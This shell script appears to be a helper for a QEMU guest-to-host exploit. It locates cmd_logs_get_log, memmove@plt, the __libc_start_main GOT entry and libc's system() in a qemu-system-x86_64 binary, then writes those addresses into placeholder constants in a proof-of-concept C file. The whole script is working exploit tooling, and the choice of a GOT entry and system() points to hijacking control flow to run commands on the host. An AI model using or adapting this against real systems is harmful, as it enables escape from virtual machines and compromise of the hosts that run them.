#!/bin/sh
set -eu

POC=${1:-poc.c}

echo "[*] finding cmd_logs_get_log..."
cmd_logs_get_log=$(readelf -s qemu-system-x86_64  | grep cmd_logs_get_log | awk '{print $2}')
echo "[+] cmd_logs_get_log: $(printf '0x%s' "$cmd_logs_get_log")"

echo "[*] finding memmove@plt..."
memmove_plt=$(objdump -S -j .plt.sec qemu-system-x86_64 | grep "<memmove@plt>:" | awk '{print $1}')
echo "[+] memmove@plt: $(printf '0x%s' "$memmove_plt")"

echo "[*] finding __libc_start_main@got..."
libc_start_main_got=$(objdump -S qemu-system-x86_64 | grep "libc_start_main" | awk '{print $(NF-1)}')
echo "[+] __libc_start_main@got: $(printf '0x%s' "$libc_start_main_got")"

echo "[*] finding libc..."
libc_line=$(ldd ./qemu-system-x86_64 | grep libc.so | awk '{print $3}')
echo "[+] libc: $libc_line"

echo "[*] finding __libc_start_main..."
libc_start_main=$(readelf -sW $libc_line | grep -i __libc_start_main | awk '{print $2}')
echo "[+] __libc_start_main: $(printf '0x%s' "$libc_start_main")"

echo "[*] finding system..."
system=$(readelf -sW $libc_line | grep -i system@ | awk '{print $2}')
echo "[+] system: $(printf '0x%s' "$system")"

hexlit()
{
  printf '0x%s\n' "$1"
}

replace()
{
  old=$1
  new=$2

  tmp="$POC.tmp.$$"
  sed "s/$old/$new/g" "$POC" > "$tmp"
  mv "$tmp" "$POC"
}

echo "[*] updating $POC..."
replace 047E735 $cmd_logs_get_log
replace 0341BB0 $memmove_plt
replace 01E72FF8 $libc_start_main_got
replace 2A200 $libc_start_main
replace 058750 $system
echo "[+] done"
